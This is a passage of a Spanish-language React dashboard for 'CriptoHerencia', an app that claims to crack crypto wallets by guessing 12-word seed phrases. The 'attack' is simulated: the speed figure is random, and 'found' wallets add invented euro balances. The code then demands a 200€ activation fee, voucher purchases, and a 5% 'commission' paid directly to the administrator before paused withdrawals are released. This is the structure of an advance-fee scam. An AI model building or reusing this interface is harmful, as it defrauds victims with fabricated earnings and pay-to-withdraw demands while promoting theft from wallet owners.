                          toast({
                            title: "Prueba Gratis Agotada",
                            description: "Ya usaste tu prueba gratis. Activa el programa para continuar",
                            variant: "destructive"
                          });
                          return;
                        }
                        // Solo permitir si NO ha usado la prueba gratis
                        startSimulation();
                        return;
                      }
                      startSimulation();
                    }}
                    disabled={!selectedCrypto || attackInProgress || (!user.verified && (hasUsedFreeTrial || user.has_used_free_trial))}
                    className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-400 hover:to-red-500 text-white font-sans font-bold text-lg px-8 py-4 rounded-lg shadow-lg"
                  >
                    <div className="text-center">
                      <div>EMPEZAR ATAQUE</div>
                      {!user.verified && !hasUsedFreeTrial && !user.has_used_free_trial && (
                        <div className="text-sm italic font-normal opacity-90">
                          (una prueba gratis)
                        </div>
                      )}
                    </div>
                  </Button>
                </div>

                {/* Attack System - Professional Design */}
                <Card className="bg-white border-gray-200 shadow-sm">
                  <CardHeader className="border-b border-gray-100">
                    <CardTitle className="text-gray-800 font-sans text-lg">Sistema de Ataque</CardTitle>
                  </CardHeader>
                  <CardContent className="p-6">
                    {(!user.verified && (hasUsedFreeTrial || user.has_used_free_trial)) ? (
                      <div className="relative p-4 md:p-6 bg-gray-100 rounded border border-gray-300 min-h-[300px] sm:min-h-[400px] max-h-[300px] sm:max-h-[400px] overflow-hidden">
                        {/* Blurred 12 Words Background */}
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-6 opacity-20 blur-sm">
                          {/* Left Column (1-6) */}
                          <div className="space-y-1 sm:space-y-2">
                            {Array(6).fill().map((_, index) => (
                              <div
                                key={index}
                                className="p-2 sm:p-3 rounded border border-gray-300 text-left font-mono text-xs sm:text-sm bg-gray-200"
                              >
                                [{String(index + 1).padStart(2, '0')}] ••••••••
                              </div>
                            ))}
                          </div>
                          {/* Right Column (7-12) */}
                          <div className="space-y-1 sm:space-y-2">
                            {Array(6).fill().map((_, index) => (
                              <div
                                key={index + 6}
                                className="p-2 sm:p-3 rounded border border-gray-300 text-left font-mono text-xs sm:text-sm bg-gray-200"
                              >
                                [{String(index + 7).padStart(2, '0')}] ••••••••
                              </div>
                            ))}
                          </div>
                        </div>
                        
                        {/* Overlay Message - Centered and Clean */}
                        <div className="absolute inset-0 flex flex-col items-center justify-center bg-white/90 backdrop-blur-sm">
                          {/* Animated Lock Icon */}
                          <div className="mb-4">
                            <div className="animate-bounce">
                              <Lock className="h-12 w-12 md:h-16 md:w-16 text-red-500 mx-auto" />
                            </div>
                          </div>
                          
                          <div className="text-center px-4">
                            <h3 className="text-lg md:text-xl font-bold text-gray-800 mb-3 font-sans">
                              ACCESO BLOQUEADO
                            </h3>
                            <p className="text-gray-700 font-sans text-sm md:text-base leading-relaxed">
                              Para usar CriptoHerencia y así ganar dinero<br />
                              necesitas activar el programa.
                            </p>
                          </div>
                        </div>
                      </div>
                    ) : (
                      <>
                        {/* Fixed Static Search Box - Professional White Design with Better Mobile Layout */}
                        <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 sm:p-6 min-h-[500px] sm:min-h-[400px] max-h-[500px] sm:max-h-[400px]">
                          {/* Status Text */}
                          <div className="text-center mb-4 h-16 flex flex-col justify-center">
                            {searchStatus === 'idle' && (
                              <div className="text-gray-700 font-bold font-sans text-lg">
                                BUSCANDO BILLETERA CON FONDOS
                              </div>
                            )}
                            
                            {searchStatus === 'searching' && (
                              <>
                                <div className="text-blue-600 font-bold font-sans text-lg animate-pulse">
                                  BUSCANDO BILLETERA CON FONDOS
                                </div>
                                <div className="text-gray-500 font-sans text-sm mt-1">
                                  Tipo: {selectedCrypto} | Velocidad: {Math.floor(Math.random() * 5000 + 1000)}/seg
                                </div>
                              </>
                            )}
                            
                            {searchStatus === 'found' && foundWallet && (
                              <>
                                <div className="text-green-600 font-bold font-sans text-lg mb-2">
                                  WALLET ENCONTRADA
                                </div>
                                <div className="text-gray-800 font-sans text-base">
                                  Se han sumado {cryptoLogos[foundWallet.type]} €{foundWallet.amount} en tu panel
                                </div>
                              </>
                            )}
                          </div>
                          
                          {/* 12 Words Grid - Mobile Responsive, Centered and Static with 50% zoom */}
                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4 mb-6 px-2 sm:px-8 max-w-4xl mx-auto" style={{ transform: 'scale(0.5)', transformOrigin: 'center' }}>
                            {/* Left Column (1-6) */}
                            <div className="space-y-1 sm:space-y-2">
                              {currentWords.slice(0, 6).map((word, index) => (
                                <div
                                  key={`left-${index}`}
                                  className={`p-2 sm:p-3 rounded border text-left font-mono text-xs sm:text-sm min-h-[2.5rem] sm:min-h-[3rem] flex items-center ${
                                    searchStatus === 'searching'
                                      ? 'border-blue-400 text-blue-600 bg-blue-50' 
                                      : 'border-gray-300 text-gray-700 bg-gray-50'
                                  }`}
                                  style={{ width: '100%' }}
                                >
                                  <span className="w-full truncate">
                                    [{String(index + 1).padStart(2, '0')}] {
                                      // Solo ocultar la primera palabra cuando se encuentra la wallet
                                      searchStatus === 'found' && index === 0 ? '*****' : word
                                    }
                                  </span>
                                </div>
                              ))}
                            </div>
                            {/* Right Column (7-12) */}
                            <div className="space-y-1 sm:space-y-2">
                              {currentWords.slice(6, 12).map((word, index) => (
                                <div
                                  key={`right-${index + 6}`}
                                  className={`p-2 sm:p-3 rounded border text-left font-mono text-xs sm:text-sm min-h-[2.5rem] sm:min-h-[3rem] flex items-center ${
                                    searchStatus === 'searching'
                                      ? 'border-blue-400 text-blue-600 bg-blue-50' 
                                      : 'border-gray-300 text-gray-700 bg-gray-50'
                                  }`}
                                  style={{ width: '100%' }}
                                >
                                  <span className="w-full truncate">
                                    [{String(index + 7).padStart(2, '0')}] {word}
                                  </span>
                                </div>
                              ))}
                            </div>
                          </div>
                          
                          {/* Bottom Button Area - ALWAYS SAME POSITION */}
                          <div className="text-center h-12 flex items-center justify-center">
                            {searchStatus === 'idle' && (
                              <div className="text-gray-500 font-sans text-sm">
                                Presiona "EMPEZAR ATAQUE" para comenzar la búsqueda
                              </div>
                            )}
                            
                            {searchStatus === 'found' && (
                              <Button
                                onClick={continueSearching}
                                className="bg-green-500 hover:bg-green-600 text-white font-bold font-sans px-6 py-2 rounded-lg"
                              >
                                SEGUIR BUSCANDO
                              </Button>
                            )}
                          </div>
                        </div>
                      </>
                    )}
                  </CardContent>
                </Card>
              </div>
            )}

            {currentView === 'history' && (
              <Card className="bg-slate-900/80 border-green-400/50">
                <CardHeader>
                  <CardTitle className="text-green-400 font-mono text-sm">&gt; HISTORIAL DE RETIROS</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    {getHistory().length === 0 ? (
                      <div className="text-center py-8 text-slate-400">
                        <History className="h-16 w-16 mx-auto mb-4 opacity-50" />
                        <p className="font-mono">&gt; SIN RETIROS REGISTRADOS</p>
                      </div>
                    ) : (
                      getHistory().map((item) => (
                        <div key={item.id} className="bg-slate-800 rounded-lg border border-slate-700 overflow-hidden">
                          {/* Header del retiro */}
                          <div className="flex items-center justify-between p-4 border-b border-slate-700">
                            <div className="flex items-center space-x-3">
                              <div className="text-green-400 font-bold font-mono text-lg">
                                {cryptoIcons[item.type]} €{item.amount?.toFixed(2)} {item.type}
                              </div>
                              <Badge 
                                variant="outline" 
                                className={
                                  item.status === 'PAUSADO' 
                                    ? "border-orange-500 text-orange-400 bg-orange-500/10 font-mono" 
                                    : "border-green-400 text-green-400 bg-green-400/10 font-mono"
                                }
                              >
                                {item.status}
                              </Badge>
                            </div>
                            <div className="text-sm text-slate-400 font-mono">
                              {new Date(item.date).toLocaleDateString('es-ES', {
                                year: 'numeric',
                                month: '2-digit',
                                day: '2-digit',
                                hour: '2-digit',
                                minute: '2-digit'
                              })}
                            </div>
                          </div>
                          
                          {/* Detalles del retiro */}
                          <div className="p-4 space-y-3">
                            <div>
                              <div className="text-xs text-slate-500 font-mono uppercase tracking-wide mb-1">
                                DIRECCIÓN DESTINO
                              </div>
                              <div className="text-xs text-blue-400 font-mono break-all bg-slate-900 p-2 rounded border">
                                {item.wallet}
                              </div>
                            </div>
                            
                            {item.status === 'PAUSADO' && (
                              <>
                                <div>
                                  <div className="text-xs text-slate-500 font-mono uppercase tracking-wide mb-1">
                                    COMISIÓN ADMINISTRATIVA
                                  </div>
                                  <div className="text-sm text-orange-400 font-mono bg-orange-500/10 p-2 rounded border border-orange-500/20">
                                    5% = €{item.commission?.toFixed(2)}
                                  </div>
                                </div>
                                
                                <div>
                                  <div className="text-xs text-slate-500 font-mono uppercase tracking-wide mb-1">
                                    ESTADO DEL PROCESO
                                  </div>
                                  <div className="text-xs text-slate-300 bg-slate-900 p-3 rounded border leading-relaxed">
                                    <div className="text-orange-400 font-semibold mb-2">⏸️ RETIRO PAUSADO</div>
                                    <p className="mb-2">{item.processingNote}</p>
                                    <div className="text-yellow-400 font-mono text-xs">
                                      ⚠️ ACCIÓN REQUERIDA: {item.statusNote}
                                    </div>
                                  </div>
                                </div>
                                
                                <div className="bg-blue-900/20 border border-blue-500/30 rounded p-3">
                                  <div className="text-blue-400 font-mono text-xs font-semibold mb-2">
                                    💡 INFORMACIÓN IMPORTANTE
                                  </div>
                                  <div className="text-blue-200 text-xs leading-relaxed">
                                    La comisión del 5% no puede ser descontada del saldo del programa por políticas de seguridad. 
                                    Debe ser transferida directamente al administrador del sistema para completar el retiro.
                                  </div>
                                </div>
                              </>
                            )}
                            
                            {item.status === 'Retirado' && (
                              <div>
                                <div className="text-xs text-slate-500 font-mono uppercase tracking-wide mb-1">
                                  ESTADO DEL PROCESO
                                </div>
                                <div className="text-xs text-green-400 bg-green-500/10 p-2 rounded border border-green-500/20">
                                  ✅ COMPLETADO - Fondos transferidos exitosamente
                                </div>
                              </div>
                            )}
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Withdraw View */}
            {currentView === 'withdraw' && (
              <Card className="bg-slate-900/80 border-green-400/50">
                <CardHeader>
                  <CardTitle className="text-green-400 font-mono text-sm">&gt; RETIRAR FONDOS</CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  {!selectedWithdrawCrypto ? (
                    <div>
                      <div className="text-slate-300 font-mono text-sm mb-4">
                        &gt; Selecciona la criptomoneda que deseas retirar:
                      </div>
                      
                      <div className="space-y-3">
                        {['BTC', 'ETH', 'LTC'].map((crypto) => {
                          const balance = user.balance?.[crypto] || 0;
                          return (
                            <Button
                              key={crypto}
                              onClick={() => setSelectedWithdrawCrypto(crypto)}
                              className="w-full justify-between bg-slate-800 hover:bg-slate-700 border border-green-400/50 text-green-400 font-mono p-4"
                              disabled={balance === 0}
                            >
                              <span className="flex items-center">
                                <Bitcoin className="h-4 w-4 mr-2" />
                                {crypto}:
                              </span>
                              <span className="font-bold">
                                €{balance.toFixed(2)}
                              </span>
                            </Button>
                          );
                        })}
                      </div>
                    </div>
                  ) : (
                    <div>
                      <div className="flex items-center justify-between mb-4">
                        <div className="text-green-400 font-mono text-lg flex items-center">
                          <Bitcoin className="h-5 w-5 mr-2" />
                          Retirar {selectedWithdrawCrypto}: €{(user.balance?.[selectedWithdrawCrypto] || 0).toFixed(2)}
                        </div>
                        <Button
                          onClick={() => {
                            setSelectedWithdrawCrypto('');
                            setWithdrawWallet('');
                          }}
                          variant="ghost"
                          size="sm"
                          className="text-slate-400 hover:text-white font-mono"
                        >
                          &gt; VOLVER
                        </Button>
                      </div>
                      
                      <div className="space-y-4">
                        <div>
                          <Label className="text-blue-400 font-mono text-xs">&gt; WALLET DESTINO ({selectedWithdrawCrypto}):</Label>
                          <Input
                            value={withdrawWallet}
                            onChange={(e) => setWithdrawWallet(e.target.value)}
                            placeholder={`Introduce tu dirección ${selectedWithdrawCrypto}`}
                            className="bg-slate-800 border-green-500/30 text-green-300 mt-2 font-mono"
                          />
                          <p className="text-xs text-slate-400 mt-1 font-mono">
                            &gt; Los fondos se enviarán a esta dirección
                          </p>
                        </div>
                        
                        <div className="text-center pt-4">
                          <Button
                            onClick={processWithdrawal}
                            disabled={!withdrawWallet.trim()}
                            className="bg-gradient-to-r from-green-600 to-green-700 hover:from-green-500 hover:to-green-600 text-black font-mono font-bold px-8 py-3"
                          >
                            &gt; PROCESAR RETIRO
                          </Button>
                        </div>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            )}
          </div>
        </div>

        {/* Modal de Activación de Programa (aparece solo al intentar retirar) - Mobile Optimized */}
        {showActivationModal && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-2">
            <div className="bg-white rounded-lg shadow-2xl w-full max-w-sm sm:max-w-md overflow-hidden max-h-[90vh] overflow-y-auto">
              <div className="bg-gradient-to-r from-blue-900/90 to-purple-900/90 p-4 sm:p-6">
                <div className="flex items-start space-x-3">
                  <div className="flex-shrink-0">
                    <div className="w-8 h-8 sm:w-12 sm:h-12 bg-blue-500 rounded-full flex items-center justify-center">
                      <AlertCircle className="h-4 w-4 sm:h-6 sm:w-6 text-white" />
                    </div>
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex justify-between items-start">
                      <h3 className="text-lg sm:text-xl font-bold text-white mb-2">
                        🔐 ACTIVA EL PROGRAMA
                      </h3>
                      <Button
                        onClick={() => setShowActivationModal(false)}
                        variant="ghost"
                        className="text-white hover:bg-white/20 p-1 flex-shrink-0"
                      >
                        <X className="h-4 w-4 sm:h-5 sm:w-5" />
                      </Button>
                    </div>
                    <p className="text-blue-100 text-xs sm:text-sm mb-3 sm:mb-4 leading-relaxed">
                      Para poder retirar los fondos que has conseguido <strong className="text-blue-300">necesitas activar el programa primero</strong>. 
                      Tu saldo actual de <strong className="text-green-300">€{getTotalBalance().toFixed(2)}</strong> estará disponible para retiro inmediatamente después de la activación.
                    </p>
                    <div className="bg-blue-800/50 rounded-lg p-3 sm:p-4 mb-3 sm:mb-4">
                      <div className="flex items-center space-x-2 mb-2">
                        <CheckCircle className="h-3 w-3 sm:h-4 sm:w-4 text-green-400 flex-shrink-0" />
                        <span className="text-xs sm:text-sm text-white font-semibold">¿Qué obtienes al activar?</span>
                      </div>
                      <ul className="text-xs text-blue-200 space-y-1 ml-5 sm:ml-6">
                        <li>• <strong>Retiros ilimitados</strong> de todos tus fondos</li>
                        <li>• <strong>Ataques ilimitados</strong> sin restricciones</li>
                        <li>• <strong>Soporte prioritario</strong> 24/7</li>
                        <li>• <strong>Actualizaciones</strong> y mejoras automáticas</li>
                      </ul>
                    </div>
                    <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-3">
                      <Button
                        onClick={() => {
                          setShowActivationModal(false);
                          setShowPurchaseModal(true);
                        }}
                        className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-500 hover:to-blue-600 text-white font-bold px-3 sm:px-4 py-2 text-xs sm:text-sm rounded-lg flex-1"
                      >
                        🚀 Activar Programa (200€)
                      </Button>
                      <Button
                        onClick={() => {
                          setShowActivationModal(false);
                          setCurrentView('simulator');
                        }}
                        variant="outline"
                        className="border-blue-400 text-blue-300 hover:bg-blue-900/50 px-3 sm:px-4 py-2 text-xs sm:text-sm rounded-lg sm:flex-shrink-0"
                      >
                        Seguir Atacando
                      </Button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Modal Principal de COMPRAR para usuarios no verificados */}
        {showPurchaseModal && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-2 sm:p-4">
            <div className="bg-white rounded-lg shadow-2xl w-full max-w-md max-h-[95vh] sm:max-h-[90vh] overflow-y-auto mx-2 sm:mx-0">
              <div className="p-4 sm:p-6 border-b border-gray-200">
                <div className="flex items-center justify-between">
                  <h2 className="text-lg sm:text-xl font-semibold text-gray-900 flex items-center">
                    <Plus className="h-4 w-4 sm:h-5 sm:w-5 mr-2 text-gray-700" />
                    <span className="text-sm sm:text-base">Comprar Programa</span>
                  </h2>
                  <Button
                    onClick={() => setShowPurchaseModal(false)}
                    size="sm"
                    variant="outline"
                    className="border-gray-300 text-gray-500 hover:bg-gray-100 p-1 sm:p-2"
                  >
                    <X className="h-3 w-3 sm:h-4 sm:w-4" />
                  </Button>
                </div>
              </div>
              
              <div className="p-4 sm:p-6 space-y-4">
                <p className="text-gray-600 text-sm mb-6">
                  Selecciona tu método de pago preferido para activar el programa:
                </p>
                
                <Button
                  onClick={() => {
                    setShowPurchaseModal(false);
                    setShowCryptoPayment(true);
                  }}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium text-sm py-3"
                >
                  💰 Comprar con Criptomonedas
                </Button>
                
                <Button
                  onClick={() => {
                    setShowPurchaseModal(false);
                    setShowCardPayment(true);
                  }}
                  className="w-full bg-slate-600 hover:bg-slate-700 text-white font-medium text-sm py-3"
                >
                  💳 Comprar con TARJETA
                </Button>
              </div>
            </div>
          </div>
        )}

        {/* Modal Principal de RECARGAR */}
        {showRechargeModal && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-2 sm:p-4">
            <div className="bg-white rounded-lg shadow-2xl w-full max-w-md max-h-[95vh] sm:max-h-[90vh] overflow-y-auto mx-2 sm:mx-0">
              <div className="p-4 sm:p-6 border-b border-gray-200">
                <div className="flex items-center justify-between">
                  <h2 className="text-lg sm:text-xl font-semibold text-gray-900 flex items-center">
                    <Plus className="h-4 w-4 sm:h-5 sm:w-5 mr-2 text-gray-700" />
                    <span className="text-sm sm:text-base">Recargar Saldo</span>
                  </h2>
                  <Button
                    onClick={() => setShowRechargeModal(false)}
                    size="sm"
                    variant="outline"
                    className="border-gray-300 text-gray-500 hover:bg-gray-100 p-1 sm:p-2"
                  >
                    <X className="h-3 w-3 sm:h-4 sm:w-4" />
                  </Button>
                </div>
              </div>
              
              <div className="p-4 sm:p-6 space-y-4">
                <p className="text-gray-600 text-sm mb-6">
                  Selecciona tu método de pago preferido para recargar saldo:
                </p>
                
                <Button
                  onClick={() => {
                    setShowRechargeModal(false);
                    setShowRechargeCrypto(true);
                  }}
                  className="w-full bg-orange-500 hover:bg-orange-600 text-white font-medium text-sm py-3"
                >
                  💰 Recargar con Criptomonedas
                </Button>
                
                <Button
                  onClick={() => {
                    setShowRechargeModal(false);
                    setShowRechargeCard(true);
                  }}
                  className="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium text-sm py-3"
                >
                  💳 Recargar con TARJETA
                </Button>
              </div>
            </div>
          </div>
        )}

        {/* Modal Recargar con Criptomonedas */}
        {showRechargeCrypto && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-4">
            <div className="bg-white rounded-lg shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
              <div className="p-6 border-b border-gray-200">
                <div className="flex items-center justify-between">
                  <h2 className="text-xl font-semibold text-gray-900 flex items-center">
                    <Wallet className="h-5 w-5 mr-2 text-gray-700" />
                    Recarga con Criptomonedas
                  </h2>
                  <Button
                    onClick={() => setShowRechargeCrypto(false)}
                    size="sm"
                    variant="outline"
                    className="border-gray-300 text-gray-500 hover:bg-gray-100"
                  >
                    <X className="h-4 w-4" />
                  </Button>
                </div>
              </div>
              
              <div className="p-6 space-y-6">
                <p className="text-gray-600 text-sm mb-4">
                  Envía tu pago a la dirección correspondiente según la criptomoneda que uses:
                </p>
                
                {['BTC', 'ETH', 'LTC'].map((crypto) => (
                  <div key={crypto} className="border rounded-lg p-4 bg-gray-50">
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center">
                        <div className="text-xl mr-3">{cryptoIcons[crypto]}</div>
                        <div>
                          <h3 className="font-semibold text-gray-800">{crypto}</h3>
                          <p className="text-xs text-gray-500">Envía desde cualquier wallet</p>
                        </div>
                      </div>
                    </div>
                    
                    <div className="bg-white p-3 rounded border">
                      <p className="text-xs text-gray-500 mb-1">Dirección de {crypto}:</p>
                      <div className="flex items-center justify-between">
                        <code className="text-sm text-gray-800 flex-1 mr-2 break-all">
                          {paymentAddresses[crypto]}
                        </code>
                        <Button
                          onClick={() => copyToClipboard(paymentAddresses[crypto])}
                          size="sm"
                          variant="outline"
                          className="text-xs px-2 py-1"
                        >
                          Copiar
                        </Button>
                      </div>
                    </div>
                  </div>
                ))}
                
                <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg">
                  <h3 className="font-semibold text-blue-800 mb-2">ℹ️ Instrucciones</h3>
                  <ul className="text-blue-700 text-sm space-y-1">
                    <li>• Envía el pago a la dirección correspondiente</li>
                    <li>• El saldo se actualizará automáticamente tras confirmación</li>
                    <li>• Las transacciones pueden tardar 10-60 minutos</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Modal Recargar con TARJETA (reutiliza el diseño mejorado) */}
        {showRechargeCard && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-2 sm:p-4">
            <div className="bg-white rounded-lg shadow-2xl w-full max-w-lg max-h-[95vh] sm:max-h-[90vh] overflow-y-auto mx-2 sm:mx-0">
              <div className="p-4 sm:p-6 border-b border-gray-200">
                <div className="flex items-center justify-between">
                  <h2 className="text-lg sm:text-xl font-semibold text-gray-900 flex items-center">
                    <CreditCard className="h-4 w-4 sm:h-5 sm:w-5 mr-2 text-gray-700" />
                    <span className="text-sm sm:text-base">Recarga con Tarjeta</span>
                  </h2>
                  <Button
                    onClick={() => setShowRechargeCard(false)}
                    size="sm"
                    variant="outline"
                    className="border-gray-300 text-gray-500 hover:bg-gray-100 p-1 sm:p-2"
                  >
                    <X className="h-3 w-3 sm:h-4 sm:w-4" />
                  </Button>
                </div>
              </div>
              
              <div className="p-4 sm:p-6 space-y-4 sm:space-y-6">
                {/* Paso 1: Comprar CryptoVoucher */}
                <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-lg p-3 sm:p-4">
                  <div className="flex items-start space-x-2 sm:space-x-3">
                    <div className="flex-shrink-0 w-6 h-6 sm:w-8 sm:h-8 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold text-xs sm:text-sm">
                      1
                    </div>
                    <div className="flex-1 min-w-0">
                      <h3 className="font-semibold text-gray-800 mb-2 text-sm sm:text-base">
                        🛒 Compra tu CryptoVoucher de 200€
                      </h3>
                      <p className="text-gray-600 text-xs sm:text-sm mb-3 pr-2">
                        Para recargar tu saldo de forma <strong>rápida y segura</strong>, compra una CryptoVoucher (tarjeta regalo digital) por <strong>200€</strong>.
                      </p>
                      <Button
                        onClick={() => window.open('https://tarjetadirecta.es/product/crypto-voucher-200-euros', '_blank')}
                        className="bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-medium text-xs sm:text-sm px-3 sm:px-4 py-2 rounded-lg flex items-center space-x-1 sm:space-x-2 w-full sm:w-auto"
                      >
                        <span>🛍️</span>
                        <span className="truncate">Comprar CryptoVoucher 200€</span>
                      </Button>
                    </div>
                  </div>
                </div>

                {/* Paso 2: Canjear código */}
                <div className="bg-gradient-to-r from-orange-50 to-yellow-50 border border-orange-200 rounded-lg p-3 sm:p-4">
                  <div className="flex items-start space-x-2 sm:space-x-3">
                    <div className="flex-shrink-0 w-6 h-6 sm:w-8 sm:h-8 bg-orange-600 text-white rounded-full flex items-center justify-center font-bold text-xs sm:text-sm">
                      2
                    </div>
                    <div className="flex-1 min-w-0">
                      <h3 className="font-semibold text-gray-800 mb-2 text-sm sm:text-base">
                        🔑 Canjea tu código aquí
                      </h3>
                      <p className="text-gray-600 text-xs sm:text-sm mb-3 pr-2">
                        Tras la compra recibirás un <strong>código de activación</strong>. Introdúcelo aquí y tu saldo se recargará <strong>inmediatamente</strong>.
                      </p>
                      
                      <div className="space-y-3">
                        <div>
                          <Label className="text-gray-700 font-medium text-xs sm:text-sm">Código del Voucher:</Label>
                          <Input
                            value={voucherCode}
                            onChange={(e) => setVoucherCode(e.target.value)}
                            placeholder="CV-XXXX-XXXX-XXXX"
                            className="bg-gray-50 border-gray-200 text-gray-800 mt-1 text-xs sm:text-sm"
                          />
                        </div>
                        
                        <Button
                          onClick={submitVoucher}
                          className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-medium text-xs sm:text-sm py-2"
                          disabled={!voucherCode.trim()}
                        >
                          🚀 Recargar Saldo Inmediatamente
                        </Button>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div className="bg-blue-50 border border-blue-200 p-3 sm:p-4 rounded-lg">
                  <p className="text-blue-800 text-xs sm:text-sm">
                    <strong>💡 Proceso completo:</strong> Compra → Recibe código por email → Introdúcelo aquí → ¡Tu saldo se recarga al instante!
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default UserDashboard;